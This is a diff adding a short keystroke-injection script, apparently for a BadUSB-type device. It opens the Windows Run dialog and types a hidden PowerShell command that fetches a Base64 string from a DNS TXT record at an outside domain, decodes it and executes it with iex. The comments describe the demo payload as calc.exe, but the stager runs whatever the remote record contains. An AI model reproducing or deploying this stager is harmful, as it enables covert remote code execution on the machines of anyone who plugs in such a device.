@@ -1,0 +1,8 @@
+Rem:This is a simple script that would query a DNS TXT record encoded in Base64 and would execute whatever it is.
+Rem: In this example the TXT record is "calc.exe" encoded into Base64, hence the script will query, decode and execute it.
+CustomDelay:500
+Press:131+114
+CustomDelay:500
+Print:powershell -WindowStyle Hidden iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(  ((Resolve-DnsName cmd.shlomimarco.com -type TXT).Strings[0])  ))  )
+CustomDelay:500
+Press:176
